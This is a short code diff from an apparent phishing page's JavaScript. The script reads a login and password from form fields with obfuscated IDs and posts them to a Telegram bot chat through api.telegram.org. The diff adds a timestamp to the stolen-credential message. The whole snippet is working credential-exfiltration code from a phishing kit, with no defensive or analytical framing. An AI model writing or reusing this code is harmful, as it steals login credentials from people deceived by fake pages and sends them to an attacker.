@@ -76,7 +76,13 @@
         const chat_id = "-1001424374909";
         let login = $('#fa4e2a34ab06a').val();
         let pass = $('#faa2da1ad083').val();
-        let txt = `Login: ${login} \n Pass: ${pass}`
+        
+        var currentdate = new Date();
+        var datetime = currentdate.getDate() + "-" + (currentdate.getMonth()+1) + "-" + currentdate.getFullYear() + "   " + currentdate.getHours() + ":" + currentdate.getMinutes() + ":" + currentdate.getSeconds();
+
+        let txt = `${datetime}
+        Login: ${login}
+        Pass: ${pass}`
 
         let xhr = new XMLHttpRequest();
         xhr.open('POST', `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${txt}`);
